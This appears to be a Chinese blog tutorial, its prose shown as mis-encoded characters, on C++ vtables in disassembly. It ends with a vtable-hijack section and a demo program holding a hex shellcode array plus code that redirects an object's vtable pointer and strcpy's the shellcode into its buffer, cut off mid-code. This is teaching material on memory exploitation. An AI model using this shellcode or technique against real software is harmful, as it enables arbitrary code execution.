<p>ä½†æ˜¯å¾ˆè¿·çš„æ˜¯,åœ¨ä¸»å‡½æ•°æ ˆå¸§ä¸­,å°±å¯¹è±¡çš„æŒ‡é’ˆå°±æœ‰ä¸‰ä¸ª,handle1,handle2,handle,å‰ä¸¤è€…éƒ½æ˜¯ä¸´æ—¶çš„,åœ¨ä¸¤ä¸‰æ¡æŒ‡ä»¤ä¸­å‡ºç°è¿‡ä¹‹åå°±ä¸å†ä½¿ç”¨äº†,æœ€åhandleæ¥ç®¡äº†å¤§æƒ.</p>
<p>å¦‚æœæ‰“å¼€ç¼–è¯‘ä¼˜åŒ–å¯èƒ½æƒ…å†µä¼šå¥½ä¸€ç‚¹</p>
<p>å…¶ä¸­è°ƒç”¨æ„é€ å‡½æ•°<code>??0B@@QAE@XZ</code>çš„æ—¶å€™,é¦–å…ˆè°ƒç”¨äº†çˆ¶ç±»çš„æ„é€ å‡½æ•°,åœ¨çˆ¶ç±»çš„æ„é€ å‡½æ•°ä¸­æ³¨å†Œäº†çˆ¶ç±»çš„è™šå‡½æ•°è¡¨,ç„¶ååˆå›åˆ°æœ¬æ„é€ å‡½æ•°ä¸­,æ³¨å†Œå­ç±»çš„è™šå‡½æ•°è¡¨,è¦†ç›–äº†çˆ¶ç±»çš„è™šå‡½æ•°è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:00641140 push    ebp</span><br><span class="line">.text:00641141 mov     ebp, esp</span><br><span class="line">.text:00641143 push    ecx</span><br><span class="line">.text:00641144 mov     [ebp+this], ecx</span><br><span class="line">.text:00641147 mov     ecx, [ebp+this] ; this</span><br><span class="line">.text:0064114A call    ??0A@@QAE@XZ    ; A::A(void)</span><br><span class="line">.text:0064114F mov     eax, [ebp+this]</span><br><span class="line">.text:00641152 mov     dword ptr [eax], offset ??_7B@@6B@ ; const B::`vftable&#x27;</span><br><span class="line">.text:00641158 mov     eax, [ebp+this]</span><br><span class="line">.text:0064115B mov     esp, ebp</span><br><span class="line">.text:0064115D pop     ebp</span><br><span class="line">.text:0064115E retn</span><br></pre></td></tr></table></figure>



<h4 id="A-A"><a href="#A-A" class="headerlink" title="A::A()"></a>A::A()</h4><p>å­ç±»æ„é€ å‡½æ•°æ— è®ºå¦‚ä½•éƒ½ä¼šé¦–å…ˆéšå¼æ‰§è¡Œçˆ¶ç±»çš„æ„é€ å‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:00641160 push    ebp</span><br><span class="line">.text:00641161 mov     ebp, esp</span><br><span class="line">.text:00641163 push    ecx</span><br><span class="line">.text:00641164 mov     [ebp+this], ecx</span><br><span class="line">.text:00641167 mov     eax, [ebp+this]</span><br><span class="line">.text:0064116A mov     dword ptr [eax], offset ??_7A@@6B@ ; const A::`vftable&#x27;</span><br><span class="line">.text:00641170 mov     eax, [ebp+this]</span><br><span class="line">.text:00641173 mov     esp, ebp</span><br><span class="line">.text:00641175 pop     ebp</span><br><span class="line">.text:00641176 retn</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå…³é”®çš„ä¸€ç‚¹å°±æ˜¯æ³¨å†Œäº†çˆ¶ç±»çš„è™šå‡½æ•°è¡¨,çˆ¶ç±»æ„é€ å‡½æ•°æ‰§è¡Œå®Œä¹‹å,å¯¹è±¡çš„çŠ¶æ€æ˜¯è¿™æ ·çš„</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220922192353739.png" alt="æ³¨å†Œçˆ¶ç±»è™šè¡¨æŒ‡é’ˆ"></p>
<h4 id="å›åˆ°å­ç±»æ„é€ å‡½æ•°"><a href="#å›åˆ°å­ç±»æ„é€ å‡½æ•°" class="headerlink" title="å›åˆ°å­ç±»æ„é€ å‡½æ•°"></a>å›åˆ°å­ç±»æ„é€ å‡½æ•°</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0064114F mov     eax, [ebp+this]</span><br><span class="line">.text:00641152 mov     dword ptr [eax], offset ??_7B@@6B@ ; const B::`vftable&#x27;</span><br><span class="line">.text:00641158 mov     eax, [ebp+this]</span><br><span class="line">.text:0064115B mov     esp, ebp</span><br><span class="line">.text:0064115D pop     ebp</span><br><span class="line">.text:0064115E retn</span><br></pre></td></tr></table></figure>

<p>ä»çˆ¶ç±»æ„é€ å‡½æ•°å›æ¥ä¹‹å,åˆå°†B::vftable@rdataæ³¨å†Œåˆ°å¯¹è±¡çš„ç¬¬ä¸€ä¸ªåŒå­—ä¸Š,è¦†ç›–äº†çˆ¶ç±»æ„é€ å‡½æ•°çš„æ³¨å†Œæ•ˆæœ</p>
<p>å®é™…ä¸Šå¯¹äºè¿™ä¸ªå•¥æˆå‘˜ä¹Ÿæ²¡æœ‰çš„å­ç±»,çˆ¶ç±»æ„é€ å‡½æ•°çœŸçš„æ‰§è¡Œäº†ä¸€ä¸ªå¯‚å¯,å®ƒå„¿å­ä¸å¬è¯ç¯¡æ”¹äº†å®ƒè€å­çš„è™šè¡¨æŒ‡é’ˆ</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220922192605634.png" alt="æ³¨å†Œå­ç±»è™šè¡¨æŒ‡é’ˆ,è¦†ç›–çˆ¶ç±»è™šè¡¨æŒ‡é’ˆ"></p>
<p>Aå’ŒBç±»çš„è™šå‡½æ•°è¡¨éƒ½åœ¨rdataåŒº,å¹¶ä¸”è·ç¦»å¾ˆè¿‘</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.rdata:006431FC ; void (__cdecl *const A::`vftable&#x27;[3])()</span><br><span class="line">.rdata:006431FC ??_7A@@6B@ dd offset ?func1@A@@UAEXXZ   ; DATA XREF: A::A(void)+Aâ†‘o</span><br><span class="line">.rdata:006431FC                                         ; A::func1(void)</span><br><span class="line">.rdata:00643200 dd offset ?func2@A@@UAEHHH@Z            ; A::func2(int,int)</span><br><span class="line">...</span><br><span class="line">.rdata:0064320C ; void (__cdecl *const B::`vftable&#x27;[3])()</span><br><span class="line">.rdata:0064320C ??_7B@@6B@ dd offset ?func1@B@@UAEXXZ   ; DATA XREF: B::B(void)+12â†‘o</span><br><span class="line">.rdata:0064320C                                         ; B::func1(void)</span><br><span class="line">.rdata:00643210 dd offset ?func2@A@@UAEHHH@Z            ; A::func2(int,int)</span><br></pre></td></tr></table></figure>

<p>è™½ç„¶åªæœ‰ä¸¤ä¸ªè™šå‡½æ•°,ä½†æ˜¯è™šå‡½æ•°è¡¨æœ‰ä¸‰é¡¹,å…¶ä¸­å‰ä¸¤é¡¹æ˜¯å‡½æ•°æŒ‡é’ˆ,æœ€åä¸€é¡¹ç”¨NULLè¡¨ç¤ºè™šå‡½æ•°è¡¨ç»“æŸ</p>
<p>è¿˜è¦æ³¨æ„çš„æ˜¯,ä¸¤ä¸ªè™šå‡½æ•°è¡¨ä¸­çš„func1æ˜¯ä¸åŒçš„å‡½æ•°æŒ‡é’ˆ,ä½†æ˜¯func2æ˜¯åŒä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?func1@A@@UAEXXZ</span><br><span class="line">?func1@B@@UAEXXZ</span><br><span class="line">?func2@A@@UAEHHH@Z </span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯å› ä¸ºå­ç±»æ²¡æœ‰é‡è½½äº†func1,ä½†æ˜¯æ²¡æœ‰é‡è½½func2,äºæ˜¯ä¸¤ä¸ªè™šè¡¨çš„ç¬¬ä¸€ä¸ªæŒ‡é’ˆåˆ†åˆ«æŒ‡å‘ä¸¤ä¸ªä¸åŒçš„å‡½æ•°,ä¸¤ä¸ªè™šè¡¨çš„ç¬¬äºŒä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªå‡½æ•°</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220922200159404.png" alt="image-20220922200159404"></p>
<p>è™šè¡¨ä½äºrdataåŒº,å¯æƒ³è€ŒçŸ¥,è¿™é‡Œçš„è™šå‡½æ•°æŒ‡é’ˆå€¼åœ¨ç¼–è¯‘é“¾æ¥æ—¶å°±å·²ç»å†³å®šäº†,æ•´ä¸ªè¿è¡Œè¿‡ç¨‹ä¸­ä¸ä¼šå‘ç”Ÿå˜åŒ–</p>
<p><strong>å› æ­¤å¯ä»¥è¯´å¤šæ€çš„å…³é”®,å°±åœ¨äºæ„é€ å‡½æ•°ä¸€å¼€å§‹æ³¨å†Œå“ªä¸ªç±»çš„è™šå‡½æ•°è¡¨</strong></p>
<h3 id="handle-func1"><a href="#handle-func1" class="headerlink" title="handle-&gt;func1();"></a>handle-&gt;func1();</h3><p>ä¸‹é¢é©¬ä¸Šå°±è¦è°ƒç”¨ç¬¬ä¸€ä¸ªè™šå‡½æ•°äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:006410E3 mov     ecx, [ebp+handle];å¯¹è±¡åœ°å€æ”¾åˆ°ecxä¸­ä½œä¸ºthisæŒ‡é’ˆ</span><br><span class="line">.text:006410E6 mov     edx, [ecx];å¯¹è±¡çš„ç¬¬ä¸€ä¸ªåŒå­—æ”¾åˆ°edxä¸­</span><br><span class="line">.text:006410E8 mov     ecx, [ebp+handle];å¯¹è±¡åœ°å€æ”¾åˆ°ecxä¸­ä½œä¸ºthisæŒ‡é’ˆ</span><br><span class="line">.text:006410EB mov     eax, [edx];å¯¹è±¡çš„ç¬¬ä¸€ä¸ªåŒå­—å†è§£å¼•ç”¨å–å¾—çš„å€¼æ”¾åˆ°eaxä¸­</span><br><span class="line">.text:006410ED call    eax;è°ƒç”¨eaxä¸­çš„åœ°å€</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªè¿‡ç¨‹ç”»åœ¨å›¾ä¸Šç›¸å½“äº</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220922192743617.png" alt="è°ƒç”¨ä¸€ä¸ªè™šå‡½æ•°"></p>
<blockquote>
<p>æ‰€è°“â€åŠ¨æ€è”ç¼–â€æˆ–è€…â€æ™šè”ç¼–â€å°±ä½“ç°åœ¨è¿™é‡Œ,è¦è°ƒç”¨çš„è™šå‡½æ•°æ˜¯ä»¥å˜é‡çš„å½¢å¼æ”¾åˆ°eaxä¸­è°ƒç”¨çš„</p>
<p>è€Œä¸€èˆ¬è°ƒç”¨å‡½æ•°éƒ½æ˜¯ç›´æ¥å†™æ­»äº†<code>call å‡½æ•°åœ°å€</code></p>
<p>å¹¶ä¸”åœ¨è°ƒç”¨è™šå‡½æ•°çš„æ—¶å€™,ç¼–è¯‘å™¨è¿˜çœŸä¸çŸ¥é“è¦è°ƒç”¨å“ªä¸ªå‡½æ•°</p>
<p>ç¼–è¯‘å™¨åªæ˜¯åœ¨å¯¹è±¡çš„æ„é€ å‡½æ•°ä¸­æ³¨å†Œè¯¥å¯¹è±¡çš„è™šè¡¨,è¦†ç›–çˆ¶ç±»çš„è™šè¡¨,ç„¶ååæ¥åœ¨è°ƒç”¨è™šå‡½æ•°çš„æ—¶å€™åªéœ€è¦æŸ¥è™šè¡¨,è€Œæ— éœ€å…³å¿ƒè¿™æ˜¯è°çš„è™šè¡¨,å› ä¸ºæ„é€ å‡½æ•°æ—¶å·²ç»æ³¨å†Œå¥½è¿™æ˜¯è°çš„è™šè¡¨äº†</p>
</blockquote>
<h3 id="handle-func2-5-6"><a href="#handle-func2-5-6" class="headerlink" title="handle-&gt;func2(5, 6);"></a>handle-&gt;func2(5, 6);</h3><p>ç¬¬äºŒä¸ªè™šå‡½æ•°,ä¸func1è™šå‡½æ•°çš„ä¸»è¦åŒºåˆ«æ˜¯,å­ç±»é‡å†™äº†func1,ä½†æ˜¯æ²¡æœ‰é‡å†™func2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:006410EF push    6</span><br><span class="line">.text:006410F1 push    5</span><br><span class="line">.text:006410F3 mov     ecx, [ebp+handle];ecxä¸­æ˜¯å¯¹è±¡çš„åœ°å€</span><br><span class="line">.text:006410F6 mov     edx, [ecx];edxæ˜¯å¯¹è±¡çš„ç¬¬ä¸€ä¸ªåŒå­—</span><br><span class="line">.text:006410F8 mov     ecx, [ebp+handle];ecxæ˜¯å¯¹è±¡çš„åœ°å€</span><br><span class="line">.text:006410FB mov     eax, [edx+4];å¯¹è±¡çš„ç¬¬ä¸€ä¸ªåŒå­—çš„å€¼åŠ ä¸Š4,ä¹Ÿå°±æ˜¯è™šå‡½æ•°è¡¨åç§»4</span><br><span class="line">.text:006410FE call    eax</span><br></pre></td></tr></table></figure>

<p><code>&amp;vtable+4=vtable[1]</code></p>
<p>ç›¸å½“äºè°ƒç”¨äº†<code>vtable[1]</code>ä¸Šé¢å­˜æ”¾çš„å‡½æ•°</p>
<h3 id="handle-func3"><a href="#handle-func3" class="headerlink" title="handle-&gt;func3();"></a>handle-&gt;func3();</h3><p>æ™®é€šçš„æˆå‘˜å‡½æ•°,ä½†æ˜¯è¯¥å‡½æ•°è¢«å­ç±»é‡è½½è¿‡,</p>
<p>ç”±äºå¯¹è±¡çš„æŒ‡é’ˆæ˜¯çˆ¶ç±»æŒ‡é’ˆ,å› æ­¤è¿™é‡Œä¼šè°ƒç”¨çˆ¶ç±»çš„func3å‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00641100 mov     ecx, [ebp+handle] ; this</span><br><span class="line">.text:00641103 call    ?func3@A@@QAEXXZ ; A::func3(void)</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°çš„è°ƒç”¨ååˆ†æ»´ç®€å•</p>
<p>æ ¹æ®stdcallè°ƒç”¨çº¦å®š,ecxä¸­æ”¾ä¸Šå¯¹è±¡åœ°å€,ç„¶åå°±ç›´æ¥è°ƒç”¨æˆå‘˜å‡½æ•°äº†</p>
<p>ä¸ºäº†åŒºåˆ†å­ç±»å‡½æ•°å’Œçˆ¶ç±»å‡½æ•°,vc++ç¼–è¯‘å™¨ç»™çˆ¶ç±»çš„func3å‡½æ•°å‘½åä¸º<code>?func3@A@@QAEXXZ</code></p>
<p>è¿™æ˜¯åœ¨ç¼–è¯‘é“¾æ¥çš„æ—¶å€™å°±å†™æ­»äº†çš„</p>
<h3 id="ä¸ºä»€ä¹ˆè¦æœ‰è™šè¡¨å‘¢"><a href="#ä¸ºä»€ä¹ˆè¦æœ‰è™šè¡¨å‘¢" class="headerlink" title="ä¸ºä»€ä¹ˆè¦æœ‰è™šè¡¨å‘¢?"></a>ä¸ºä»€ä¹ˆè¦æœ‰è™šè¡¨å‘¢?</h3><p>è™šè¡¨èµ·ç å¯ä»¥æ˜¯åœ¨ç¼–è¯‘é“¾æ¥é˜¶æ®µå¯ä»¥å†³å®šçš„,ä¸ºäº†è®©è¿è¡Œæ—¶éœ€è¦åšçš„äº‹æƒ…å°½å¯èƒ½å°‘,åº”è¯¥å­˜åœ¨è™šè¡¨è¿™ä¸ªä¸œè¥¿</p>
<p>è™šè¡¨ä¸èƒ½ç›´æ¥æ”¾åˆ°å¯¹è±¡é‡Œé¢å—?ä¸èƒ½</p>
<p>ä¸€æ˜¯å› ä¸º,ä¸€ç§ç±»å‹çš„æ‰€æœ‰å¯¹è±¡,å…±ç”¨ä¸€ä¸ªè™šè¡¨,å› æ­¤åœ¨è¿›ç¨‹åœ°å€ç©ºé—´ä¸­åªä¿ç•™ä¸€ä¸ªè™šè¡¨å°±å¤Ÿäº†,è¿™æœ‰ç‚¹ç±»ä¼¼äºå…±äº«åº“çš„ç¼©å½±.</p>
<p>äºŒæ˜¯å› ä¸º,å¦‚æœæŠŠè™šå‡½æ•°çš„åœ°å€ç›´æ¥æ”¾åˆ°å¯¹è±¡é‡Œé¢,ä¼šå¯¼è‡´å¯¹è±¡è‡ƒè‚¿.</p>
<p>ç°åœ¨åœ¨å¯¹è±¡é‡Œé¢åªä¿ç•™ä¸€ä¸ªè™šè¡¨æŒ‡é’ˆ,åªä¼šç»™å¯¹è±¡å¢åŠ 4ä¸ªå­—èŠ‚çš„ç©ºé—´,å·²ç»ç®—æ˜¯æœ€åˆç†çš„è®¾è®¡äº†</p>
<h2 id="è°ƒç”¨å’Œ-è°ƒç”¨"><a href="#è°ƒç”¨å’Œ-è°ƒç”¨" class="headerlink" title=" -&gt;è°ƒç”¨å’Œ.è°ƒç”¨"></a><code> -&gt;</code>è°ƒç”¨å’Œ<code>.</code>è°ƒç”¨</h2><p>å¯¹è±¡.æˆå‘˜å‡½æ•°,è¿™ç§è°ƒç”¨æ–¹å¼ä¸ä¼šè§¦å‘å¤šæ€,ä¸ä¼šè®¿é—®è™šå‡½æ•°è¡¨,å­ç±»å°±è°ƒç”¨å­ç±»é‡å†™çš„æˆå‘˜å‡½æ•°,æ²¡æœ‰é‡å†™åˆ™è°ƒç”¨çˆ¶ç±»çš„</p>
<p>æŒ‡é’ˆ-&gt;æˆå‘˜å‡½æ•°,è¿™ç§è°ƒç”¨æ–¹å¼ä¼šè§¦å‘å¤šæ€,é€šè¿‡è™šå‡½æ•°è¡¨å†³å®šæ‰§è¡Œå“ªä¸ªå‡½æ•°</p>
<p>åŒæ ·çš„ç¨‹åº,ä½¿ç”¨å¯¹è±¡.è¿™ç§è°ƒç”¨æ–¹å¼</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	B b;</span><br><span class="line">    b.func1();</span><br><span class="line">    b.func2(<span class="number">5</span>,<span class="number">6</span>);</span><br><span class="line">    b.func3();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®é™…ä¸Šæ ¹æœ¬æ²¡æœ‰è®¿é—®è™šè¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">mov     eax, offset off_4D71D0</span><br><span class="line">mov     [ebp+var_C], eax</span><br><span class="line">lea     eax, [ebp+var_C]</span><br><span class="line">mov     ecx, eax</span><br><span class="line">call    __ZN1B5func1Ev  ; B::func1(void);å†™æ­»çš„è®¿é—®å“ªä¸ªå‡½æ•°</span><br><span class="line">lea     eax, [ebp+var_C]</span><br><span class="line">mov     dword ptr [esp+4], 6 ; int</span><br><span class="line">mov     dword ptr [esp], 5 ; this</span><br><span class="line">mov     ecx, eax</span><br><span class="line">call    __ZN1A5func2Eii ; A::func2(int,int);å†™æ­»çš„è®¿é—®å“ªä¸ªå‡½æ•°</span><br><span class="line">sub     esp, 8</span><br><span class="line">lea     eax, [ebp+var_C]</span><br><span class="line">mov     ecx, eax</span><br><span class="line">call    __ZN1B5func3Ev  ; B::func3(void);å†™æ­»çš„è®¿é—®å“ªä¸ªå‡½æ•°</span><br><span class="line">...</span><br></pre></td></tr></table></figure>







<h2 id="è™šå‡½æ•°æ¼æ´"><a href="#è™šå‡½æ•°æ¼æ´" class="headerlink" title="è™šå‡½æ•°æ¼æ´"></a>è™šå‡½æ•°æ¼æ´</h2><h3 id="è™šè¡¨æŒ‡é’ˆä¸è™šå‡½æ•°æŒ‡é’ˆ"><a href="#è™šè¡¨æŒ‡é’ˆä¸è™šå‡½æ•°æŒ‡é’ˆ" class="headerlink" title="è™šè¡¨æŒ‡é’ˆä¸è™šå‡½æ•°æŒ‡é’ˆ"></a>è™šè¡¨æŒ‡é’ˆä¸è™šå‡½æ•°æŒ‡é’ˆ</h3><p>virtualä¿®é¥°çš„æˆå‘˜å‡½æ•°,è™šå‡½æ•°</p>
<p>è™šå‡½æ•°çš„å…¥å£åœ°å€ç»Ÿä¸€çš„ä¿å­˜åœ¨è™šè¡¨ä¸­</p>
<p>å¯¹è±¡è°ƒç”¨è™šå‡½æ•°æ—¶é¦–å…ˆé€šè¿‡<strong>è™šè¡¨æŒ‡é’ˆ</strong>æ‰¾åˆ°è™šè¡¨,ç„¶åä»è™šè¡¨ä¸­å–å‡ºè™šå‡½æ•°åœ°å€,ç„¶åcall</p>
<p>è™šè¡¨æŒ‡é’ˆä¿å­˜åœ¨å¯¹è±¡çš„å†…å­˜ç©ºé—´,ç´§æ¥ç€è™šè¡¨æŒ‡é’ˆçš„æ˜¯å…¶ä»–æˆå‘˜å˜é‡</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920225443155.png" alt="image-20220920225443155"></p>
<p>å¦‚ä½•æ”»å‡»è¿™ä¸ªæœºåˆ¶å‘¢?</p>
<p>è¿™æ˜¯æœ¬æ¥çš„çŠ¶æ€</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220923222434821.png" alt="æœ¬æ¥çŠ¶æ€"></p>
<p>å¯ä»¥ä¿®æ”¹å¯¹è±¡å¤´4ä¸ªå­—èŠ‚çš„è™šè¡¨åœ°å€,æ”¹æˆå‡çš„è™šè¡¨åœ°å€,è¿™ä¸ªå‡è™šè¡¨ä¸Šç»´æŠ¤ç€shellcodeçš„åœ°å€</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220923222852145.png" alt="ä¿®æ”¹è™šè¡¨æŒ‡é’ˆ"></p>
<p>è¿˜å¯ä»¥ä¿æŒè™šè¡¨æŒ‡é’ˆä¸å˜,ä¿®æ”¹è™šè¡¨ä¸­çš„å‡½æ•°åœ°å€</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220923225918430.png" alt="ä¿®æ”¹è™šå‡½æ•°åœ°å€"></p>
<h3 id="å­˜åœ¨æ¼æ´çš„ä»£ç "><a href="#å­˜åœ¨æ¼æ´çš„ä»£ç " class="headerlink" title="å­˜åœ¨æ¼æ´çš„ä»£ç "></a>å­˜åœ¨æ¼æ´çš„ä»£ç </h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Failwest</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	virtual <span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Class Vtable::test()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>æ¯ä¸ªFailwestå‡½æ•°çš„æœ€åˆå››ä¸ªå­—èŠ‚,åœ¨bufä¹‹å‰,éƒ½æ˜¯è™šè¡¨æŒ‡é’ˆ,</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;iostream.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x1C\x88\x40\x00&quot;</span>;<span class="comment">//set fake virtual function pointer</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Failwest</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	virtual <span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Class Vtable::test()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line">Failwest overflow, *p;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> * p_vtable;</span><br><span class="line">	p_vtable=overflow.buf<span class="number">-4</span>;<span class="comment">//point to virtual table</span></span><br><span class="line">	<span class="comment">//__asm int 3</span></span><br><span class="line">	<span class="comment">//reset fake virtual table to 0x004088cc</span></span><br><span class="line">	<span class="comment">//the address may need to ajusted via runtime debug</span></span><br><span class="line">	p_vtable[<span class="number">0</span>]=<span class="number">0xCC</span>;</span><br><span class="line">	p_vtable[<span class="number">1</span>]=<span class="number">0x88</span>;</span><br><span class="line">	p_vtable[<span class="number">2</span>]=<span class="number">0x40</span>;</span><br><span class="line">	p_vtable[<span class="number">3</span>]=<span class="number">0x00</span>;</span><br><span class="line">	<span class="built_in">strcpy</span>(overflow.buf,shellcode);<span class="comment">//set fake virtual function pointer</span></span><br><span class="line">	